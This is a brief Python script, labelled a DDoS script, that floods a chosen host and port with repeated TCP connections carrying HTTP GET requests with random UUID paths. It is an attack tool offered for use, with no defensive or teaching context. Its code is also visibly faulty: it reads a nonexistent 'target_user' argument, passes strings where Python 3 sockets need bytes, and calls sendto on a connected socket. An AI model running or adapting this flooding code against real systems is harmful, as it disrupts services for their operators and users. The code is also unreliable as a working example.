""" DDOS script. """

import socket
import argparse
import uuid


# TODO: Multithreaded messages


def main():
    # Parse arguments
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('target_host', type=str,
                        help='Target host')
    parser.add_argument("-m", '--message', type=str, default=None,
                        help='Message to send')
    parser.add_argument('-n', "--n-messages", type=int, default=100,
                        help='Number of messages to send')
    parser.add_argument('-p', "--port", type=int, default=80,
                        help='Port to attack')

    args = parser.parse_args()

    ddos(target_host=args.target_host,
         message=args.target_user,
         n_messages=args.n_messages,
         port=args.port)


def ddos(target_host: str, message: str = None, n_messages: int = 1_000, port: int = 80):
    if message is None:
        for _ in range(n_messages):
            message = uuid.uuid4()
            send_message(target_host=target_host, message=message, port=port)
    else:
        for _ in range(n_messages):
            send_message(target_host=target_host, message=message, port=port)


def send_message(target_host: str, message: str, port: int = 80):
    ip = socket.gethostbyname(target_host)
    message = "GET /%s HTTP/1.1\r\n" % message

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((target_host, port))

            # TODO: 3 messages ?
            s.send(message)
            s.sendto(message, (ip, port))
            s.send(message)
        except socket.error:
            print("[-] Connexion error")


if __name__ == '__main__':
    main()
